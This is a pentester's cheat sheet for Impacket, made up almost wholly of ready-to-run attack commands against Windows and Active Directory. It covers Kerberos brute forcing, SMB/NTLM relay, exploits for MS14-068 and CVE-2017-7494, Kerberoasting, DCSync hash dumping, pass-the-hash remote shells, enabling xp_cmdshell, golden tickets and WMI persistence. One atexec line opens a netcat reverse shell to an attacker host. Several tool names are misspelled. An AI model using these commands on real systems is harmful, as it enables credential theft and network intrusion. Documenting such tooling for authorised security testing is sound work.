---
layout: notes
permalink: /notes/cheat/impacket/
title: Impacket Cheat Sheet
---

# Impacket Cheat Sheet

<!-- -------------------------------------Attacks and Exploits-------------------------------------------- -->


<details markdown="1">
<summary>Attacks and Exploits</summary>
<p></p>

### impacket-kerbrute
```
# Brute-forces user/password combinations against Kerberos.
impacket-kerbrute -userfile userlist.txt -password Passw0rd! domain.com
```

### impacket-karmaSMB
```
# Executes SMB relay attack, intercepts and relays authentication attempts.
impacket-karmaSMB -h target
```

### impacket-karmaTFTP
```
# Performs TFTP relay attack, similar to karmaSMB.py but over TFTP.
impacket-karmaTFTP -h target
```

### impacket-goldenpac
```
# Exploit script for MS14-068, saves golden ticket, launches PSEXEC session.
impacket-goldenpac domain/user:password@target
```

### impacket-sambapipe
```
# Exploits CVE-2017-7494, uploads and executes shared library.
impacket-sambapipe -so /path/to/shared/library.so domain/user:password@target
```

### impacket-smbrelayx
```
# Exploit script for CVE-2015-0005, uses SMB Relay Attack, gathers session key through NETLOGON.
impacket-smbrelayx -h target
```

### impacket-ntlmrelayx
```
# Executes NTLM Relay Attacks, sets up servers (SMB, HTTP, WCF, RAW), relays to multiple protocols.
impacket-ntlmrelayx -h target
```
</details>

<!-- -------------------------------------Database Interaction-------------------------------------------- -->


<details markdown="1">
<summary>Database Interaction</summary>
<p></p>

### impacket-mssqlclient
```
# Retrieves the MSSQL instances names from the target host.
impacket-mssqlclient 192.168.1.2

# MSSQL client, supports SQL/Windows Authentications (including hashes), TLR.
impacket-mssqlclient domain/user:password@target
impacket-mssqlclient -windows-auth htb.local/mssql-svc@10.10.x.x

# Connect to MS-SQL Server via default SA creds
impacket-mssqlclient sa:'poiuytrewq'@<target>

# Enable XP_CMDSHELL for Remote Code Exection
> EXECUTE sp_configure 'show advanced options', 1;
> RECONFIGURE;
> EXECUTE sp_configure 'xp_cmdshell', 1;
> RECONFIGURE;
> xp_cmdshell '<command>'
```
</details>


<!-- -------------------------------------File System Tools-------------------------------------------- -->


<details markdown="1">
<summary>File System Tools</summary>
<p></p>

### impacket-esentutl
```
# Dumps catalogs, pages, tables of ESE databases (e.g., NTDS.dit).
impacket-esentutl -m tables path\to\database.edb
```

### impacket-ntfs-read
```
# Provides mini-shell for browsing/extracting NTFS volume, including hidden/locked contents.
impacket-ntfs-read /path/to/ntfs/device
```

### impacketregistry-read
```
# Parses offline Windows Registry hives, useful for forensic investigations.
impacketregistry-read /path/to/registry/file
```
</details>

<!-- -------------------------------------Information Gathering-------------------------------------------- -->


<details markdown="1">
<summary>Information Gathering</summary>
<p></p>

### impacket-wmiquery
```
# Issues WQL queries, obtains descriptions of WMI objects at target system.
impacket-wmiquery domain/user:password@target "select name from win32_account"
```

### impacket-finddelegation
```
# Lists all delegation relationships (unconstrained, constrained, resource-based) in Active Directory.
impacket-finddelegation domain/user:password@target
```

### impacket-getadusers
```
# Gathers domain users and their email addresses, includes last logon/password set info.
impacket-getadusers domain/user:password@target
```

### impacket-get-gpppassword
```
# Extracts/decrypts Group Policy Preferences passwords, parses GPP XML files offline.
impacket-get-gpppassword domain/user:password@target
```

### impacket-lookupsid
```
# Windows SID brute forcer through MS-LSAT MSRPC Interface, finds users/groups.
impacket-lookupsid domain/user:password@target
```

### impacket-netview
```
# Gets list of sessions opened at remote hosts, tracks logins/logouts.
impacket-netview domain/user:password@target
```

### impacket-rpcdump
```
# Dumps list of RPC endpoints and string bindings, matches with well-known endpoints.
impacket-rpcdump domain/user:password@target
```

### impacket-rpcmaps
```
# Scans for listening DCE/RPC interfaces, binds to MGMT interface or tries known UUIDs.
impacket-rpcmaps domain/user:password@target
```

### impacket-samrdump
```
# Manipulates Windows services through MS-SCMR MSRPC Interface (start, stop, delete, etc.).
impacket-services domain/user:password@target list
```

### impacket-mssqlinstance
```
# Retrieves MSSQL instance names from target host.
impacket-mssqlinstance domain/user:password@target
```

### impacket-rdp_check
```
# Tests account validity on target host using partial MS-RDPBCGR and MS-CREDSSP implementation.
impacket-rdp_check target username password
```

### impacket-mqtt_check
```
# Simple MQIT example, tests different login options, can be used for brute-forcing.
impacket-mqt_check target -u username -P password
```
</details>

<!-- -------------------------------------Kerberos Manipulation-------------------------------------------- -->


<details markdown="1">
<summary>Kerberos Manipulation</summary>
<p></p>

### impacket-GetTGT
```
# GetTGT enables you to request a Ticket Granting Ticket (TGT) and save it as ccache, given a password, hash, or aesKey.
impacket-GetTGT test.local/user:password
```

### impacket-GetST
```
# GetST is designed to request a Service Ticket (ST) and save it as ccache given a password, hash, aesKey, or TGT in ccache. If an account has constrained delegation (with protocol transition) privileges, you can use the ‘-impersonate’ switch to request the ticket on behalf of another user. 
impacket-GetST test.local/user:password -impersonate victim_user
```

### impacket-GetPac
```
# GetPac uses a mix of [MS-SFU]’s S4USelf + User to User Kerberos Authentication to acquire the PAC (Privilege Attribute Certificate) structure of a target user by having normal authenticated user credentials.
impacket-GetPac test.local/user:password target_user
```

### impacket-GetUserSPNs
```
# GetUserSPNs finds and fetches Service Principal Names (SPNs) associated with normal user accounts. The output is compatible with JtR and HashCat.
impacket-GetUserSPNs test.local/user:password

# with a password
impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'

# with an NT hash
impacket-GetUserSPNs -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'

# Kerberoast without preauthentication
impacket-GetUserSPNs -no-preauth "bobby" -usersfile "services.txt" -dc-host "DC_IP_or_HOST" "DOMAIN.LOCAL"/
```

### impacket-GetNPUsers
```
# GetNPUsers lists and gets TGTs for users who have the ‘Do not require Kerberos preauthentication’ property set (UF_DONT_REQUIRE_PREAUTH). The output is compatible with JtR.
impacket-GetNPUsers test.local/

# users list dynamically queried with an RPC null session
impacket-GetNPUser -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'

# with a users file
impacket-GetNPUser -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'

# users list dynamically queried with a LDAP authenticated bind (password)
impacket-GetNPUser -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'

# users list dynamically queried with a LDAP authenticated bind (NT hash)
impacket-GetNPUser -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
```

### impacket-rbcd
```
# rbcd handles the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer.
impacket-rbcd domain/user:password
```

### impacket-ticketConverter
```
# Converts kirbi files (mimikatz) to/from ccache files used by Impacket.
impacket-ticketconverter mimikatz.kirbi
```

### impacket-ticketer
```
# Creates Golden/Silver tickets from scratch or based on a template.
impacket-ticketer -golden -user victim_user -domain
```
</details>

<!-- -------------------------------------Network Utilities-------------------------------------------- -->


<details markdown="1">
<summary>Network Utilities</summary>
<p></p>

### impacket-sniff
```
# Simple packet sniffer using pcapy library, listens for packets in transit.
impacket-sniff -i eth0
```

### impacket-sniffer
```
# Simple packet sniffer using raw socket, listens for specified protocols.
impacket-sniffer -p tcp -i eth0
```

### impacket-ping
```
# ICMP ping script, checks host status using echo/echo-reply packets.
impacket-ping target
```

### impacket-ping6
```
# IPv6 ICMP ping script, checks host status using echo/echo-reply packets.
impacket-ping6 target
```
</details>


<!-- -------------------------------------Password and Hash Dumps-------------------------------------------- -->


<details markdown="1">
<summary>Password and Hash Dumps</summary>
<p></p>

### impacket-secretsdump
```
# Dumps password hashes, LSA secrets, cached credentials, and other info. (Requirements: Domain Administrator Privileges)
impacket-secretsdump domain/user:password@target

# Remote extraction
impacket-secretsdump -just-dc-ntlm domain/user:password@IP
impacket-secretsdump -just-dc-ntlm domain/user:@IP -hashes LMHASH:NTHASH

# Extract NTLM hashes with local files
impacket-secretsdump -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL

# DCsync via Pass-the-Hash
impacket-secretsdump <domain>/<domain_admin>@<target_dc> -hashes <ntlm>:<ntlm> > <outfile.txt>

# DCsync via Kerberos Ticket
export KRB5CCNAME=/path/to/<krb5cc_ticket>
impacket-secretsdump <domain>/<domain_admin>@<target_dc> -k -no-pass > <outfile.txt>
```

### impacket-mimikatz
```
# Mini-shell controlling remote mimikatz RPC server, extracts passwords, hashes, tickets.
impacket-mimikatz domain/user:password@target
impacket-mimikatz -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password
```
</details>


<!-- -------------------------------------Remote Command Execution-------------------------------------------- -->


<details markdown="1">
<summary>Remote Command Execution</summary>
<p></p>

### impacket-psexec
```
# Acquire a SYSTEM level shell via exploiting write privileges in the default ADMIN$ share.

# PsExec will upload a .exe file to the ADMIN$ share
# Psexec via Password
impacket-psxec <domain>/<username>:'<password'@<target>

# Psexec via Pass-the-Hash
impacket-psexec <domain>/<username>@<target> -hashes <ntlm>:<ntlm>

# Psexec via Kerberos Ticket
export KRB5CCNAME=/path/to/<krb5cc_ticket>
impacket-psexec <domain>/<username>@<target> -k -no-pass

# Optional: add a specific command to execute (default: cmd.exe)
impacket-psxec <domain>/<username>:'<password>'@<target> '<command_to_execute>'

# Return Help                    : help
# Execute Local Commands         : !<local_command>
# Upload Files to Temp Directory : lput <local_file> Temp
```

### impacket-smbexec
```
# Alternative to psexec, SmbExec will upload a .exe file to the ADMIN$ share
impacket-smbexec test.local/john:password123@10.10.10.1
```

### impacket-atexec
```
# Executes commands on the target machine using the Task Scheduler service, returning the output of the performed command.
impacket-atexec test.local/john:password123@10.10.10.1

# with cleartext credentials
impacket-atexec 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami

# pass-the-hash (with an NT hash)
impacket-atexec -hashes :'NThash' 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami

# kerberos ticket in memory
impacket-atexec -no-pass -k 'DOMAIN'/'USER'@'target_ip' ' -c "nc.exe attacker_ip 4545 -e cmd.exe"'
```

### impacket-wmiexec
```
# Semi-interactive shell used through Windows Management Instrumentation (WMI). This technique is highly stealthy as it doesn’t necessitate any service/agent installation on the target server and operates as an Administrator.
impacket-wmiexec test.local/john:password123@10.10.10.1
```

### impacket-dcomexec
```
# Semi-interactive shell similiar to wmiexec.py but employs different DCOM endpoints. This technique currently supports MMC20.Application, ShellWindows, and ShellBrowserWindow objects.
impacket-dcomexec test.local/john:password123@10.10.10.1
```

### impacket-wmipersist
```
# Creates/removes WMI Event Consumer/Filter to execute Visual Basic scripts based on WQL filter/timer.
impacket-wmipersist domain/user:password@target install
```
</details>


<!-- -------------------------------------SMB/MSRPC Utilities-------------------------------------------- -->


<details markdown="1">
<summary>SMB/MSRPC Utilities</summary>
<p></p>

### impacket-smbserver
```
# Python implementation of SMB server, sets up shares and user accounts.
# Host Current Directory
impacket-smbserver <share_name> -smb2support .

# Host Specified Directory
impacket-smbserver <share_name> -smb2support <path_to_serve>

# Path to Share
# \\<ip_addr>\<share_name>\<hosted_files>
```

### impacket-addcomputer
```
# Adds computer to domain using LDAP or SAMR (SMB).
impacket-addcomputer domain/user:password@target
```

### impacket-getarch
```
# Gathers OS architecture type by abuse of MSRPC feature.
impacket-getarch domain/user:password@target
```

### impacket-exchanger
```
# Connects to MS Exchange via RPC over HTTP v2.
impacket-exchanger domain/user:password@target
```

### impacket-reg
```
# Remote registry manipulation tool through MS-RRP MSRPC Interface, similar to REG.EXE.
impacket-reg domain/user:password@target query -k HKLM\Software
```

### impacket-smbpasswd
```
# Changes expired passwords remotely over SMB (MSRPC-SAMR), alternative to smbpasswd tool.
impacket-smbpasswd -r target -U user%oldpassword -n newpassword
```

### impacket-smbclient
```
# General-purpose SMB client, lists/manipulates shares, files, directories.
# Smbclient via Password
impacket-smbclient <domain>/<username>:'<password'@<target>

# Smbclient via Pass-the-Hash
impacket-smbclient <domain>/<username>@<target> -hashes <ntlm>:<ntlm>

# Smbclient via Kerberos Ticket
export KRB5CCNAME=/path/to/<krb5cc_ticket>
impacket-smbclient <domain>/<username>@<target> -k -no-pass

# Common Commands             : cat, ls, cd, mkdir, rmdir
# List Available Shares       : shares
# Mount Share                 : use <share_name>
# Upload File                 : put <local_filename>
# Download File               : get <remote_filename>
# Download All Files from PWD : mget <match_mask>
# Change the User's Password  : password
# Return Host Information     : info
```
</details>

Other resources:\
[https://tools.thehacker.recipes/impacket](https://tools.thehacker.recipes/impacket)

All commands you may find here:\
[https://wadcoms.github.io/](https://wadcoms.github.io/)